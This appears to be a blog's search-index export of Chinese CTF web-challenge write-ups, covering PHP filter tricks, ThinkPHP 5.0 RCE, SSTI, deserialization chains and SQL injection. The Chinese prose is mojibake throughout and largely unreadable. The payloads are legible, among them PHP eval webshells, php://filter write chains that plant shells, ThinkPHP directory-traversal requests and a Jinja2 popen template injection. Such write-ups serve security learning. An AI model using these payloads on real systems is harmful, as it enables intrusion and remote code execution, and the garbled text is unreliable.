easyphpæ‰“å¼€ï¼Œä¸»ç•Œé¢å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶åŒ…å«ï¼Œç”¨ä¼ªåè®®è¯»å–ä¸€ä¸‹æºç ï¼Œå‘ç°7fa3b767c460b54a2be4d49030b349c7.phpï¼Œè¿›å…¥å‘ç°æ˜¯ä¸€é“ç»•è¿‡æ­»äº¡exitçš„é¢˜ç›®ï¼Œæ­»äº¡exitä¸€èˆ¬éƒ½æ˜¯ç”¨è¿‡æ»¤å™¨æ··æ·†ç»•è¿‡ï¼Œè¯¥é¢˜è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œé¦–å…ˆæ‰¾æ‰¾èƒ½ç”¨çš„è¿‡æ»¤å™¨ 1preg_match('/iconv|UCS|UTF|rot|quoted|base64|%|toupper|tolower|dechunk|\\.\\./i', $content) è§£ä¸€ï¼šzlibè¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œç°åœ¨èƒ½ç”¨çš„è¿‡æ»¤å™¨åªç”¨string.strip_tagså’Œå‹ç¼©è¿‡æ»¤å™¨ã€‚ strip_tagså°±ä¸è¯´äº†ï¼Œé¦–å…ˆè¯•ä¸€è¯•å‹ç¼©è¿‡æ»¤å™¨çš„ä½œç”¨ã€‚ 123&lt;?phpecho file_get_contents(\"php://filter/read=zlib.deflate/resource=1.php\");?&gt; 1&lt;?php @eval($_POST['aa']);?&gt; 1.phpå°±æ˜¯ä¸‹é¢è¿™ä¸ªæ­£å¸¸çš„é©¬ï¼Œè¿è¡Œç¨‹åºå¾—åˆ°è¢«å‹ç¼©åçš„è¾“å‡º é‚£ä¹ˆæˆ‘ä»¬å°†è¢«å‹ç¼©è¿‡çš„é©¬urlç¼–ç ï¼Œä¹‹åèƒ½ç”¨zlib.unflateæ­£å¸¸è¯»å–å‡ºæ¥ï¼Œè¿˜éœ€è¦ç”¨?&gt;é—­åˆä¹‹å‰çš„æ­»äº¡exit;ï¼Œä½¿ç”¨strip_tagsæ¥å°†å®ƒè¿‡æ»¤æ‰ã€‚ 1?&gt;%B3%B1%2F%C8%28PpH-K%CC%D1P%89%0F%F0%0F%0E%89VOLT%8F%D5%B4%B6%B7%03%00 1payload:php://filter/write=string.strip_tags|zlib.inflate/%3f%3e%B3%B1%2F%C8%28PpH-K%CC%D1P%89%0F%F0%0F%0E%89VOLT%8F%D5%B4%B6%B7%03/resource=1.php æˆåŠŸå†™å…¥shellå¹¶å°†æ­»äº¡exitè¿‡æ»¤ã€‚ è§£äºŒï¼šåˆ©ç”¨é¦–é¡µçš„includeåŒ…å«shellæ–‡ä»¶Base64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚æ‰€ä»¥base64è§£å¯†ä¼šå››ä¸ªå­—èŠ‚å››ä¸ªå­—èŠ‚è¯»å–ï¼Œè€ŒPHPåœ¨base64è§£å¯†æ—¶ï¼Œä¼šé»˜è®¤ä¸¢å¼ƒæ‰è¶…å‡ºbase64ç¼–ç è¡¨çš„çš„å­—ç¬¦ï¼Œæ‰€ä»¥ 12&lt;?php exit;PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg==PD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== &lt;?php @eval($_POST[&apos;aa&apos;]);?&gt; åœ¨è§£ç æ—¶ä¼šè¢«çœ‹æˆå¦‚ä¸‹å­—ç¬¦ä¸²ã€‚ 1phpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== ä¹‹å‰è¯´åˆ°ï¼Œä¼šå››ä¸ªå­—èŠ‚å››ä¸ªå­—èŠ‚è¯»å–å­—ç¬¦ï¼Œè€Œä¸€ä¸ªå­—ç¬¦åˆšå¥½å°±æ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œä¸ºäº†ä¿è¯æˆ‘ä»¬çš„é©¬å®Œæ•´çš„è¢«è§£å‡ºæ¥ï¼Œåœ¨å®ƒå‰é¢çš„å­—ç¬¦ä¸²å¿…é¡»æ˜¯å››çš„å€æ•°ï¼Œè€Œphpexitæ˜¯7ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦ä»»æ„è¡¥è¶³ä¸€ä¸ªå­—ç¬¦ã€‚ 1p1hpexitPD9waHAgQGV2YWwoJF9QT1NUWydhYSddOyk/Pg== ä¹‹ååœ¨includeç”¨convert.base64-decodeåŒ…å«shellæ–‡ä»¶å³å¯ã€‚","categories":[{"name":"ä¸“é¢˜  writeup","slug":"ä¸“é¢˜-writeup","permalink":"http://yoursite.com/categories/ä¸“é¢˜-writeup/"}],"tags":[]},{"title":"Nu1lCtf2020","slug":"nu1lctf2020","date":"2020-10-19T16:00:00.000Z","updated":"2020-10-21T14:33:57.178Z","comments":true,"path":"2020/10/20/nu1lctf2020/","link":"","permalink":"http://yoursite.com/2020/10/20/nu1lctf2020/","excerpt":"","text":"easyTP5å…³é—­æŠ¥é”™ï¼Œå†™å…¥æ–‡ä»¶ä¸‹è½½æºç çœ‹ä¸‹ç‰ˆæœ¬ï¼Œå‘ç°æ˜¯5.0.0ï¼Œå­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹æˆ‘çš„å¦ä¸€ç¯‡tp5.0.*æ¼æ´å¤ç°ï¼Œçœ‹çœ‹phpinfoã€‚ 1a=10&amp;_method=__construct&amp;method=GET&amp;filter[]=phpinfo å‘ç°å­˜åœ¨disable_functionå’Œopen_basedirï¼Œæ— æ³•ç›´æ¥getshellï¼Œèµ›åæ ¹æ®å‡ºé¢˜å¸ˆå‚…çš„wpï¼Œå°†å‡ ç§è§£æ³•éƒ½å¤ç°ä¸€ä¸‹ï¼Œå­¦ä¹ å­¦ä¹ ã€‚ åœ¨filterä¸­å¯ä»¥é€šè¿‡someClass::someMethodè°ƒç”¨é™æ€æ–¹æ³•ï¼Œå‘ç°åœ¨think\\Buildç±»ä¸­ï¼Œå­˜åœ¨moduleé™æ€æ–¹æ³•å¯ä»¥ç”¨æ¥å†™å…¥æ–‡ä»¶ã€‚ å½“moduleä¸ç­‰äºruntimeæ—¶ï¼Œä¼šè°ƒç”¨buildHelloé™æ€æ–¹æ³•ï¼Œåˆ›å»ºæŒ‰hello tpç•Œé¢ã€‚ æ³¨æ„è¿™è¡Œä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å˜é‡æ˜¯$module é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“çº¢åœˆä¸­çš„å†…å®¹æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œç„¶ååœ¨åˆ›å»ºç›®å½•çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›®å½•ç©¿è¶Šåˆ°publicæ–‡ä»¶å¤¹ï¼Œå°è¯•ä¸€ä¸‹ 1a=../public/555&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module ä½†æ˜¯æˆ‘ä»¬å‘ç°æŠ¥é”™äº†ï¼ŒåŸå› æ˜¯ä¸ç¬¦åˆnamespaceçš„å‘½åæ ¼å¼ï¼Œæ ¹æ®å‡ºé¢˜äººå¸ˆå‚…çš„WPï¼Œæˆ‘ä»¬å¯ä»¥ç”¨a;&#39;/../../public/&#39;.phpinfo();è¿™ç§æ–¹å¼æ¥ç»•è¿‡ï¼Œæˆ‘è§‰å¾—éå¸¸å·§å¦™ï¼Œè¿™ç§æ–¹å¼æ—¢æˆåŠŸç©¿è¶Šç›®å½•ï¼Œæœ‰ä½¿å¾—phpæ–‡ä»¶ç¬¦åˆè¯­æ³•ï¼Œè†œã€‚ 1a=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module ä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½åœ¨Windowsä¸Šä½¿ç”¨ï¼Œå› ä¸ºlinuxåœ¨mkdiræ—¶ï¼Œä¸å…è®¸æœ‰ä¸å­˜åœ¨çš„ç›®å½•ï¼Œä½†æ˜¯å½“ä¼ å…¥trueå‚æ•°æ˜¯ï¼Œå…è®¸æœ‰ä¸å­˜åœ¨ç›®å½•çš„å‡ºç°ã€‚ è¿™åœ¨PHPä¸­ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªwarningã€‚ä½†å¦‚æœæˆ‘ä»¬ä¼ å…¥å‚æ•°-pï¼Œå°±å…è®¸å­˜åœ¨ä¸å­˜åœ¨çš„ç›®å½•ï¼Œè¿™ä¸€ç‚¹åœ¨phpä¸­çš„ä½“ç°æ˜¯trueå‚æ•°ï¼Œæˆ‘ä»¬ä¼ å…¥trueå‚æ•°ï¼Œç›¸å½“äºæ‰§è¡Œäº†mkdir -pï¼Œåˆšå¥½æˆ‘ä»¬å‘ç°ï¼Œåœ¨åˆ›å»ºé»˜è®¤é¡µé¢æ—¶ï¼Œä¼šåœ¨æ‰§è¡Œä¸€æ¬¡mkdirï¼Œè€Œè¿™æ¬¡å¸¦ä¸Šäº†trueå‚æ•°ï¼Œä½†æ˜¯åœ¨TPä¸­ï¼Œç¢°åˆ°warningå°±æŠ›å‡ºå¼‚å¸¸ç»“æŸè¿è¡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•ç»•è¿‡å®ƒï¼Œåœ¨å®˜æ–¹æ‰‹å†Œå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è®¾ç½®error_reportingæ¥è®¾ç½®æŠ¥é”™çº§åˆ«ã€‚ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ‰§è¡Œerror_reporting(â€˜ä»»æ„å­—ç¬¦ä¸²â€™)æ¥ç»•è¿‡è¯¥æŠ¥é”™ï¼Œè¿˜æœ‰ä¸€ä¸ªå°±æ˜¯å‡½æ•°æ‰§è¡Œé¡ºåºçš„é—®é¢˜ï¼Œè¿™ä¸ªå‡ºé¢˜äººåˆ†æçš„å¾ˆå¥½äº†ï¼Œæˆ‘å°±ä¸å†åˆ†æäº†ã€‚payloadå¦‚ä¸‹ 1a=../public/1&amp;b=a;&apos;/../../public/&apos;.phpinfo();&amp;_method=__construct&amp;method=GET&amp;filter[0]=think\\Build::module&amp;filter[1]=error_reporting è¯´ä¸€ä¸‹æ‰§è¡Œé¡ºåºï¼Œé¦–å…ˆåˆ›å»º../public1ç›®å½•ï¼Œç„¶åæ‰§è¡Œerror_reporting(â€˜../public/1â€™)ç­‰åŒäºerror_reporting(0)ï¼Œç„¶åå°±æ˜¯åˆ›å»ºæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶ï¼Œåˆ©ç”¨æˆåŠŸã€‚ã€‚ æ³¨é‡Šç»•è¿‡è¯­æ³•é”™è¯¯å¯ä»¥é€šè¿‡//æ³¨é‡Šæ‰è·¯å¾„ï¼Œç„¶åä½¿ç”¨?&gt;é—­åˆä¹‹å‰çš„ä»£ç ï¼Œå†å†™ä¸€ä¸ªæ–°çš„é©¬ã€‚ 1a=index//../../public/?&gt;&lt;?php @eval($_POST[&apos;aa&apos;]);?&gt;&amp;_method=__construct&amp;method=GET&amp;filter[]=think\\Build::module æŠŠphpinfo()æ¢æˆ@eval($_POST[â€˜aaâ€™])ï¼›,è¿æ¥AntSwordï¼Œä½¿ç”¨Backtrace UAFå³å¯ç»•è¿‡disable_functionã€‚ DockerManageræ‰“å¼€æºç ï¼Œå‘ç°ä¼šå°†ä½ è¾“å…¥çš„è¡¨å•æ‹¼æ¥æˆä¸€é“curlå‘½ä»¤ 1$cmd = 'curl --connect-timeout 10 ' . $host_addr . ' -g ' . $cert . $key . $cacert; ä¸è¿‡ä½ è¾“å…¥çš„å˜é‡éƒ½ä¼šé€šè¿‡escapeshellargæ·»åŠ ä¸€ä¸ªå•å¼•å·å¹¶å°†å…¶ä»–å•å¼•å·è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨Linuxä¸­ï¼Œå•å¼•å·çš„æ„æ€æ˜¯å‰¥å¤ºæ‰€æœ‰å­—ç¬¦çš„ç‰¹æ®Šæ„ä¹‰ï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»ç„¶èƒ½å¤Ÿå†curlå˜é‡ä¸­ä½¿ç”¨å‚æ•°","categories":[{"name":"Nu1lCtf","slug":"Nu1lCtf","permalink":"http://yoursite.com/categories/Nu1lCtf/"}],"tags":[]},{"title":"","slug":"BUUCTF3","date":"2020-10-16T13:40:18.311Z","updated":"2020-11-28T13:57:20.479Z","comments":true,"path":"2020/10/16/BUUCTF3/","link":"","permalink":"http://yoursite.com/2020/10/16/BUUCTF3/","excerpt":"","text":"title: BUUCTF2date: 2020/10/29categories: writeup [SCTF2019]Flag Shoprobots.txtä¸­æœ‰æºç ï¼Œå‘ç°/workè·¯ç”±ä¸­å­˜åœ¨rubyREBæ¨¡æ¿æ³¨å…¥ä½†æ˜¯é•¿åº¦é™åˆ¶ä¸º7ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°[é¢„å®šä¹‰å˜é‡]&#40;https://blog.csdn.net/TomorrowAndTuture/article/details/108565910&#41;`$&#39;`,è¡¨ç¤ºçš„æ˜¯æœ€åä¸€æ¬¡æ¨¡å¼åŒ¹é…ä¸­åŒ¹é…éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´matchæ–¹æ³•ä¼šå°†å­—ç¬¦ä¸²åˆ†æˆä¸‰éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†ä¹‹å‰ï¼ŒåŒ¹é…éƒ¨åˆ†ï¼ŒåŒ¹é…éƒ¨åˆ†ä¹‹åï¼Œæ‰€ä»¥å½“ä¸å­˜åœ¨åŒ¹é…éƒ¨åˆ†æ˜¯ï¼Œ`$&#39;`å°±è¡¨ç¤ºè¯¥å˜é‡ã€‚ &lt;%=$&#39;&gt;,éœ€è¦urlç¼–ç ä¸€æ¬¡ payload=/work?secret=&amp;name=&lt;%25%3d%24%18%25&gt;&amp;do=&lt;%25%3d%24%18%25&gt;%20is%20working å¾—åˆ°SECRET,æ¥ä¸‹æ¥å°±æ˜¯JWTä¼ªé€ äº†ã€‚ [CISCN2019 åä¸œå—èµ›åŒº]Double Secretæ‰“å¼€è¿›å…¥/secretè·¯ç”±ï¼Œè¾“å…¥secretï¼Œä»æŠ¥é”™å‘ç°æ˜¯RC4åŠ å¯†ï¼Œå¯†é’¥æ˜¯HereIsTreasureï¼Œå°†è§£å¯†åçš„å­—ç¬¦ä¸²ç”¨æ¨¡æ¿æ¸²æŸ“ï¼Œå­˜åœ¨SSTIã€‚ payload: 1secret=.%14%1E%12%C3%A484mg%C2%9C%C3%8B%00%C2%81%C2%8D%C2%B8%C2%97%0B%C2%9EF%3B%C2%88m%C2%AEM5%C2%96%3D%C2%9D%5B%C3%987%C3%AA%12%C2%B4%05%C2%84A%C2%BF%17%C3%9Bh%C3%8F%C2%8F%C3%A1a%0F%C2%AE%09%C2%A0%C2%AEyS%2A%C2%A2d%7C%C2%98/%00%C2%90%C3%A9%03Y%C2%B2%C3%9B%1F%C2%B6H%3D%0A%23%C3%B1%5B%C2%9Cp%C2%AEn%C2%96i%5Dv%7FX%C2%92 [watevrCTF-2019]Cookie Storeæ‰“å¼€é¢˜ç›®ï¼Œçœ‹è§buyflagï¼Œå¯æ˜¯å‰ä¸å¤Ÿï¼Œé¢˜ç›®æœ‰cookieï¼Œé‚£å°±çœ‹çœ‹cookie,å‘ç°æ˜¯ä¸€æ®µbase64åŠ å¯†è¿‡çš„cookieï¼Œè§£å¯†ã€‚ ![image-20201028214648485]&#40;/images/BUUCTF3/image-20201028214648485.png&#41; å‘ç°moneyï¼Œä¿®æ”¹æˆ100ï¼Œä¼ ä¸Šå»å°±èƒ½ä¹°åˆ°flagã€‚ [GXYCTF2019]StrongestMindé¢˜ç›®è¯´ç®—1000æ¬¡ï¼Œæ²¡æƒ³åˆ°çœŸçš„æ˜¯1000æ¬¡ï¼Œç®—å°±å®Œäº‹å„¿ã€‚ 1234567891011121314151617181920212223242526import requestsimport reimport timeurl=\"http://903c7430-9683-4702-a278-3e79fdef8cf2.node3.buuoj.cn/index.php\"s=requests.session&amp;#40;&amp;#41;proxies = &amp;#123; \"http\": None, \"https\": None,&amp;#125;source=s.get&amp;#40;url,proxies=proxies&amp;#41;source.encdoing=\"utf-8\"expression=re.search&amp;#40;r'&amp;#40;\\d+ [+-/\\*] &amp;#41;+\\d+',source.text&amp;#41;.group&amp;#40;&amp;#41;result=eval&amp;#40;expression&amp;#41;params=&amp;#123;'answer':result&amp;#125;answer=s.post&amp;#40;url,data=params,proxies=proxies&amp;#41;for i in range&amp;#40;1000&amp;#41;: expression=re.search&amp;#40;r'&amp;#40;\\d+ [+-/\\*] &amp;#41;+\\d+',answer.text&amp;#41;.group&amp;#40;&amp;#41; result=eval&amp;#40;expression&amp;#41; params=&amp;#123;'answer':result&amp;#125; answer=s.post&amp;#40;url,data=params,proxies=proxies&amp;#41; answer.encoding=\"utf-8\" if i%50==0: time.sleep&amp;#40;1&amp;#41; print&amp;#40;answer.text&amp;#41;print&amp;#40;answer.text&amp;#41;print&amp;#40;source.text&amp;#41; [GYCTF2020]Easyphpæ‰“å¼€é¢˜ç›®ï¼Œå°è¯•äº†å„ç§sqlæ³¨å…¥ï¼Œå‘ç°æ— æ³•æ³¨å…¥ï¼Œäºæ˜¯å‘ç°www.zipä¸­æœ‰æºç ï¼Œå®¡è®¡ä¸€ç•ªï¼Œå‘ç°ç†Ÿæ‚‰çš„å­—ç¬¦ä¸²æ›¿æ¢ï¼Œè¿˜æœ‰lib.phpä¸­çš„ç±»ï¼Œé‚£è‚¯å®šæ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸äº†ï¼Œåœ¨è¿™é‡Œè¯´ä¸€ä¸‹é“¾å­ï¼Œé¦–å…ˆé€šè¿‡ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ§åˆ¶nicknameå‚æ•°ã€‚ åœ¨updateHelperä¸­æœ‰__destructæ–¹æ³•ï¼Œä½¿ç”¨echoè¾“å‡º$this-&gt;sqlè¯¥å€¼å¯æ§ï¼Œåœ¨Userç±»ä¸­æœ‰__toStringæ–¹æ³•ï¼Œnicknameå¯æ§ã€‚ 1$this-&gt;nickname-&gt;update&amp;#40;$this-&gt;age&amp;#41;; ï¼Œè€Œä¸”Infoç±»ä¸­æœ‰__callæ–¹æ³• 1echo $this-&gt;CtrlCase-&gt;login&amp;#40;$argument[0]&amp;#41;; åœ¨__callæ–¹æ³•ä¸­ï¼ŒCtrlCaseä¸argumentéƒ½å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥ç”¨__tostringè§¦å‘__callï¼Œè®©CtrlCaseå»è§¦å‘DBctrlä¸­çš„loginæ–¹æ³•ã€‚ çœ‹çœ‹DBCTRLç±»ï¼Œå‘ç°loginæ–¹æ³•æ˜¯ä¼ å…¥ä¸€ä¸ªsqlè¯­å¥ï¼Œä½¿ç”¨äº†é¢„å¤„ç†ï¼Œæ‰€ä»¥æ— æ³•æ³¨å…¥ã€‚ 1$result-&gt;bind_result&amp;#40;$idResult, $passwordResult&amp;#41;; ä½†æ˜¯ç”±äºsqlè¯­å¥å¯æ§ï¼Œæ‰€ä»¥æŸ¥è¯¢ç»“æœçš„é¡ºåºæ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è¯­å¥ï¼š 1select password,id from user where username=? å°†password,idè°ƒæ¢ä¸€ä¸‹é¡ºåºï¼Œæ‰€ä»¥ç°åœ¨$idResult=passwordï¼Œè¿”å›å¾—åˆ°å¯†ç ã€‚ 12$age=&apos;loadunionloadloadloadloadloadloadloadloadloadloadunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadunionunionloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadloadload&quot;;s:8:&quot;nickname&quot;;O:12:&quot;UpdateHelper&quot;:2:&amp;#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&amp;#123;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&amp;#123;s:3:&quot;age&quot;;i:1;s:8:&quot;nickname&quot;;i:1;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&amp;#123;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;&amp;#125;&amp;#125;&amp;#125;s:3:&quot;any&quot;;s:1:&quot;1&quot;;&amp;#125;&amp;#125;&apos;;$nickname=&quot;1&quot;; [å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ ç¡®å®ä¸Šä¼ ä¸äº†ï¼Œè¯»ä¸€ä¸‹æºç å§ï¼Œå‘ç°helperç±»ä¸­æœ‰__destructæ–¹æ³•ï¼Œåœ¨upload.phpä¸­ä¹Ÿæœ‰ååºåˆ—åŒ–ï¼Œä¼°æ‘¸ç€æ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œå®¡ä¸€ä¸‹ä»£ç é€»è¾‘ã€‚ ![image-20201029152801352]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029152801352.png&#41; å°†æ–‡ä»¶ä¸­çš„ä¿¡æ¯è¿‡æ»¤åè¯»å–åˆ°æ•°ç»„ä¸­ï¼Œæ³¨æ„$array[&#39;attr&#39;]çš„å€¼æ˜¯åºåˆ—åŒ–åçš„å€¼ï¼Œä¹‹åè°ƒç”¨saveæ–¹æ³•ä¼ å…¥æ•°æ®åº“ä¸­ã€‚ ![image-20201029152928750]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029152928750.png&#41; å°†æ•°ç»„ä¸­çš„é”®å€¼å¯¹å–å‡ºæ¥ï¼Œä½œä¸ºåˆ—åï¼Œå€¼æ’å…¥åˆ°imagesè¡¨ä¸­ï¼Œå¯è§è¿™é‡Œinsertæ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨sqlæ³¨å…¥ä»»æ„æ§åˆ¶æ’å…¥çš„å€¼ã€‚ ååºåˆ—åŒ–çš„ç‚¹åœ¨show.phpä¸­![image-20201029153211638]&#40;G:\\MyBlog\\source\\images\\BUUCTF3\\image-20201029153211638.png&#41; å°†attrçš„å€¼å–å‡ºæ¥ï¼Œç„¶åååºåˆ—åŒ–ã€‚æ‰€ä»¥ç°åœ¨æ€è·¯å°±æ¸…æ™°äº†ï¼Œåˆ©ç”¨sqlæ³¨å…¥æ§åˆ¶attrçš„å€¼ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œé“¾å­éå¸¸ç®€å•ï¼Œç›´æ¥æ”¾expäº†ï¼ˆPS:ç”±äºfilenameä¸­ä¸èƒ½æœ‰åŒå¼•å·ï¼Œè€Œåœ¨æ•°æ®åº“ä¸­ï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢æˆ16è¿›åˆ¶ï¼Œæ‰€ä»¥ç”¨16è¿›åˆ¶ç¼–ç ä¼ å€¼ï¼‰ã€‚ 1filename=&quot;1&apos;,1,1,1,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&amp;#41;#.jpg&quot; å›¾ç‰‡å†…å®¹éšä¾¿ï¼Œæ§åˆ¶æ–‡ä»¶åå°±å¥½äº†ã€‚ [RootersCTF2019]I_&lt;3_Flaskä½¿ç”¨arjunæ¢æµ‹å‚æ•°å‘ç°nameå‚æ•°ï¼Œå°è¯•&#123;&#123;7*â€˜7â€™&#125;&#125;è¿”å›7777777å¾—çŸ¥æ˜¯jinjia2æ¨¡æ¿æ³¨å…¥ï¼Œç›´æ¥è¯»flagã€‚ 1name=&amp;#123;&amp;#123;&amp;#40;&amp;#41;.__class__.__bases__[0].__subclasses__&amp;#40;&amp;#41;[80].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27]&amp;#40;%27o%27+%27s%27&amp;#41;.popen&amp;#40;&quot;cat%20flag.txt&quot;&amp;#41;.read&amp;#40;&amp;#41;&amp;#125;&amp;#125; [DDCTF 2019]homebrew event loopæ‰“å¼€é¢˜ç›®ï¼Œä¸‹è½½æºç ï¼Œå¼€å§‹å®¡è®¡ä»£ç ã€‚ [NPUCTF2020]ezincludegetæäº¤pass=cookieä¸­çš„å€¼å°±æç¤ºå­˜åœ¨flflflflag.phpï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œä½¿ç”¨ä¼ªåè®®è¯»å–æºç ï¼Œå‘ç°è¿‡æ»¤æƒ…å†µå¦‚ä¸‹ 123if&amp;#40;preg_match&amp;#40;'/data|input|zip/is',$file&amp;#41;&amp;#41;&amp;#123; die&amp;#40;'nonono'&amp;#41;;&amp;#125; åšåˆ°è¿™é‡Œæ€è·¯å°±æ–­äº†ï¼ŒæŸ¥çœ‹WriteUpå‘ç°äº†æ–°å§¿åŠ¿ï¼Œåœ¨PHP7.0ä¸­ï¼Œæ–‡ä»¶åŒ…å«ä½¿ç”¨string.strip_tagsä¼šæŠ¥Segment Faulté”™è¯¯ï¼Œå¦‚æœæ­£åœ¨ä¸Šä¼ æ–‡ä»¶ï¼Œåˆ™ä¼šå°†æ–‡ä»¶ä¿å­˜åˆ°tmpç›®å½•ä¸­ï¼Œä¸ä¼šåˆ é™¤ï¼Œé€šè¿‡ç›®å½•æ‰«æå¯ä»¥å¾—åˆ°dir.phpï¼Œè¯»å–æºç å‘ç°åˆ—å‡ºäº†tmpç›®å½•ã€‚ 1/flflflflag.php?file=php://filter/read=string.strip_tags/resource=index.php åŒæ—¶ä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åè®¿é—®dir.phpå¾—åˆ°æ–‡ä»¶è·¯å¾„ï¼ŒåŒ…å«ä¹‹ååœ¨phpinfoä¸­æ‰¾åˆ°flagã€‚ [EIS 2019]EzPOPä¸‹è½½æºç ï¼Œå¼€å§‹å®¡è®¡ï¼Œå¾ˆç›´ç™½çš„ååºåˆ—åŒ–ï¼Œåˆ©ç”¨æ–‡ä»¶å†™å…¥getshellï¼Œè¿™é‡Œå‡ºç°äº†thinkphpååºåˆ—åŒ–é“¾ä¸­å¸¸è§çš„æ­»äº¡exitï¼Œä¸è¿‡filenameå’Œcontentæ˜¯åˆ†å¼€æ§åˆ¶ï¼Œä½¿ç”¨php://filteråè®®ä¸­çš„base64è¿‡æ»¤å™¨ç»•è¿‡ï¼Œjson_encodeè¿”å›çš„æ˜¯å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨serializeå‡½æ•°å¤„ç†ã€‚ 123456789101112131415161718192021222324&lt;?phpclass A&amp;#123; protected $store; protected $key; protected $expire; public function __construct&amp;#40;&amp;#41; &amp;#123; $this-&gt;expire =0; $this-&gt;autosave=0; $this-&gt;cache=['filename']; $this-&gt;complete='PD9waHAgQGV2YWwoJF9QT1NUWydhYSddKTs/Pg=='; $this-&gt;key=\"222.php\"; $this-&gt;store=new B&amp;#40;&amp;#41;; &amp;#125;&amp;#125;class B&amp;#123; public function __construct&amp;#40;&amp;#41; &amp;#123; $this-&gt;options=[\"prefix\"=&gt;'php://filter/write=convert.base64-decode/resource=',\"serialize\"=&gt;\"serialize\"]; &amp;#125;&amp;#125;$a=new A&amp;#40;&amp;#41;;echo urlencode&amp;#40;serialize&amp;#40;$a&amp;#41;&amp;#41;; æˆåŠŸgetshellã€‚ [GWCTF 2019]mypasswordä¸€é“xssï¼ŒæŸ¥çœ‹login.jsï¼ŒåŠŸèƒ½æ˜¯å°†passwordè®°å½•ä¸€ä¸‹ã€‚ 12345678910111213if &amp;#40;document.cookie &amp;&amp; document.cookie != ''&amp;#41; &amp;#123; var cookies = document.cookie.split&amp;#40;'; '&amp;#41;; var cookie = &amp;#123;&amp;#125;; for &amp;#40;var i = 0; i &lt; cookies.length; i++&amp;#41; &amp;#123; var arr = cookies[i].split&amp;#40;'='&amp;#41;; var key = arr[0]; cookie[key] = arr[1]; &amp;#125; if&amp;#40;typeof&amp;#40;cookie['user']&amp;#41; != \"undefined\" &amp;&amp; typeof&amp;#40;cookie['psw']&amp;#41; != \"undefined\"&amp;#41;&amp;#123; document.getElementsByName&amp;#40;\"username\"&amp;#41;[0].value = cookie['user']; document.getElementsByName&amp;#40;\"password\"&amp;#41;[0].value = cookie['psw']; &amp;#125;&amp;#125; ç™»å½•æœ‰æœ‰ä¸€ä¸ªfeedbackï¼Œé¡µé¢æºä»£ç 